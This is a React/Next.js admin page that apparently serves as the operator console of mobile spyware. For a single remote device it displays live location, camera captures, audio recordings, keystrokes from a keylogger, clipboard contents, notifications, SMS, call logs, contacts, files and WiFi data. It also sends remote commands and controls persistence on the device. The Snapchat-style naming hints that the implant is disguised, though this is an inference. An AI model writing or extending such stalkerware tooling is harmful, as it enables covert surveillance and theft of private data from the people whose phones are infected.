// app/admin/devices/[id]/page.tsx
"use client";

import React, { useState, useEffect, useCallback } from "react";
import { useParams } from "next/navigation";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
import { DeviceTelemetryControlsModal } from "@/components/admin/devices/DeviceTelemetryControlsModal";
import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder, Bell, Keyboard, Clipboard, ShieldCheck } from "lucide-react";
import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";
import { useDeviceTelemetry } from "@/hooks/useDeviceTelemetry";
import { useDeviceRealtimeSync } from "@/components/admin/devices/useDeviceRealtimeSync";
import { getTabMeta } from "@/lib/device-tab-meta";
import { toast } from "@/components/ui/Toast";

const TAB_PREFS_KEY = "snap_tab_prefs_v3";

function loadTabPrefs(): Record<string, boolean> {
  if (typeof window === "undefined") return {};
  try { return JSON.parse(localStorage.getItem(TAB_PREFS_KEY) || "{}"); } catch { return {}; }
}

function saveTabPrefs(prefs: Record<string, boolean>) {
  try { localStorage.setItem(TAB_PREFS_KEY, JSON.stringify(prefs)); } catch {}
}

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const [tabPrefs, setTabPrefs] = useState<Record<string, boolean>>({});
  const [showTelemetryModal, setShowTelemetryModal] = useState(false);
  useEffect(() => { setTabPrefs(loadTabPrefs()); }, []);

  const isTabEnabled = useCallback((tabId: string) => tabPrefs[tabId] === true, [tabPrefs]);

  const {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, isLiveMovement,
    handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand, handleBulkDeleteCommands,
    handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
    handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
    fetchTabData,
  } = useDeviceDetail(deviceId, isTabEnabled);

  const {
    telemetryConfig, setTelemetryConfig, persistenceStatus, updatePersistenceStatus, currentSsid,
    notifications, keystrokes, clipboardItems, lockEvents, wifiNetworks,
    fetchTelemetryData, clearModuleData, fetchConfig,
  } = useDeviceTelemetry(deviceId);

  const toggleTab = (tabId: string) => {
    const nextVal = !isTabEnabled(tabId);
    const next = { ...tabPrefs, [tabId]: nextVal };
    setTabPrefs(next); saveTabPrefs(next);
    const meta = getTabMeta(tabId);
    if (nextVal) {
      toast.request(meta.waitMsg, 7000);
      if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
      if (["notifications", "keylogger", "clipboard", "security"].includes(tabId)) {
        fetchTelemetryData(tabId);
        setTimeout(() => fetchTelemetryData(tabId), 2500);
      } else {
        fetchTabData(tabId, true, true);
        setTimeout(() => fetchTabData(tabId, true, true), 3000);
        setTimeout(() => fetchTabData(tabId, true, true), 6000);
      }
    } else {
      toast.info(`Auto-fetch disabled for ${meta.name}`);
    }
  };

  useDeviceRealtimeSync({
    deviceId, activeTab,
    onRefreshActiveTab: (t) => fetchTabData(t, true, true),
    onRefreshLightStatus: handleFullRefresh,
    onRefreshTelemetry: fetchTelemetryData,
  });

  useEffect(() => {
    if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
      fetchTelemetryData(activeTab);
    }
  }, [activeTab, fetchTelemetryData]);

  if (loading && !device) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" />
      </div>
    );
  }
  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;

  const counts = (device as any)?.counts || {};
  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Feed", icon: Radio },
    { id: "gallery", label: `Gallery (${counts.gallery ?? files.length})`, icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
    { id: "notifications", label: `Notifs (${notifications.length})`, icon: Bell },
    { id: "keylogger", label: `Keys (${keystrokes.length})`, icon: Keyboard },
    { id: "clipboard", label: `Clips (${clipboardItems.length})`, icon: Clipboard },
    { id: "security", label: "Security & WiFi", icon: ShieldCheck },
    { id: "apps", label: `Apps (${counts.apps ?? appCount})`, icon: Layers },
    { id: "contacts", label: `Contacts (${counts.contacts ?? contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${counts.calls ?? calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${counts.messages ?? messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-3 sm:space-y-5 pb-20 md:pb-8 max-w-full overflow-x-hidden">
      <DeviceDetailHeader
        device={device}
        onRefresh={() => {
          handleFullRefresh();
          fetchConfig();
        }}
        isRefreshing={isRefreshing}
        onOpenControls={() => setShowTelemetryModal(true)}
      />

      <DeviceTabBar tabs={TABS} activeTab={activeTab} onSelectTab={setActiveTab} />

      <DeviceTabViews
        activeTab={activeTab}
        device={device}
        locations={locations}
        contacts={contacts}
        calls={calls}
        messages={messages}
        captures={captures}
        audioClips={audioClips}
        files={files}
        notifications={notifications}
        keystrokes={keystrokes}
        clipboardItems={clipboardItems}
        lockEvents={lockEvents}
        wifiNetworks={wifiNetworks}
        currentSsid={currentSsid}
        persistenceStatus={persistenceStatus}
        onClearModule={clearModuleData}
        filesLoading={filesLoading}
        tabLoading={tabLoading}
        isLiveMovement={isLiveMovement}
        isTabEnabled={isTabEnabled(activeTab)}
        onToggleTab={() => toggleTab(activeTab)}
        onFetchOnce={() => {
          const meta = getTabMeta(activeTab);
          toast.request(meta.waitMsg, 7000);
          if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
          fetchConfig();
          if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
            fetchTelemetryData(activeTab);
            setTimeout(() => { fetchTelemetryData(activeTab); fetchConfig(); }, 2500);
          } else {
            fetchTabData(activeTab, true, true);
            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 3000);
            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 6000);
          }
        }}
        onToggleLiveMovement={handleToggleLiveMovement}
        onSendCommand={sendCommand}
        onDeleteCommand={handleDeleteCommand}
        onBulkDeleteCommands={handleBulkDeleteCommands}
        onDeleteContact={handleDeleteContact}
        onDeleteCall={handleDeleteCall}
        onDeleteMessage={handleDeleteMessage}
        onDeleteApp={handleDeleteApp}
        onDeleteFile={handleDeleteFile}
        onBulkDeleteContacts={handleBulkDeleteContacts}
        onBulkDeleteCalls={handleBulkDeleteCalls}
        onBulkDeleteMessages={handleBulkDeleteMessages}
        onBulkDeleteApps={handleBulkDeleteApps}
        onBulkDeleteFiles={handleBulkDeleteFiles}
        onUpdatePersistence={updatePersistenceStatus}
      />

      <DeviceTelemetryControlsModal
        isOpen={showTelemetryModal}
        onClose={() => setShowTelemetryModal(false)}
        deviceId={deviceId}
        initialConfig={telemetryConfig}
        persistenceStatus={persistenceStatus}
        onTogglePersistence={updatePersistenceStatus}
        onSaved={(cfg) => setTelemetryConfig(cfg)}
      />
    </div>
  );
}